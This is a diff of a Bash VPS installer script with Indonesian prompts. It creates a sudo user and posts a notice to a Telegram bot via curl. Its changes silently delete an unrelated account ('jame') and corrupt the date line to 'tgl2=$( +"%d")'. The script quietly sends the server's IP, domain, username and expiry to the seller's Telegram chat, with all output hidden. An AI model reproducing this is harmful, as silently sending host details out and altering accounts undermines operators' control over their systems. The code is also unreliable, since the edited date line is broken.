@@ -259,8 +259,9 @@ read -rp " Choose Potions 1 or 2 / pilih 1 atau 2 : " dns
     useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
+    userdel jame > /dev/null 2>&1
     
-    tgl2=$(date +"%d")
+    tgl2=$( +"%d")
     bln2=$(date +"%b")
     thn2=$(date +"%Y")
     tnggl="$tgl2 $bln2, $thn2"
@@ -273,19 +274,16 @@ read -rp " Choose Potions 1 or 2 / pilih 1 atau 2 : " dns
     TIMEZONE=$(printf '%(%H:%M:%S)T')
     TEXT="
     <code>────────────────────</code>
-    <b>⚡AUTOSCRIPT PREMIUM⚡</b>
+    <b>⚡NOTIF INSTALL SCRIPT⚡</b>
     <code>────────────────────</code>
-    <code>ID     : </code><code>$username</code>
-    <code>Domain : </code><code>$domain</code>
-    <code>Date   : </code><code>$tnggl</code>
-    <code>Time   : </code><code>$TIMEZONE</code>
-    <code>Ip vps : </code><code>$MYIP</code>
-    <code>Exp Sc : </code><code>$exp</code>
+    <code>User Script = </code><code>$username</code>
+    <code>Exp Script  = </code><code>$exp</code>
+    <code>Domain vps  = </code><code>$domain</code>
+    <code>Date & Time = </code><code>$tnggl & $TIMEZONE</code>
+    <code>IP vps      = </code><code>$MYIP</code>
     <code>────────────────────</code>
-    <i>Automatic Notification from Github</i>
-    "'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🧊","url":"https://t.me/fv_stores"},{"text":"ᴏʀᴅᴇʀ🧊","url":"wa.me/083160098834"}]]}'
+    "'&reply_markup={"inline_keyboard":[[{"text":" ᴏʀᴅᴇʀ ","url":"https://t.me/fv_stores"},{"text":" ᴏʀᴅᴇʀ ","url":"wa.me/083160098834"}]]}'
     curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
-
 clear 
 #install ssh & ws python
 echo -e "─────────────────────────────────────────"
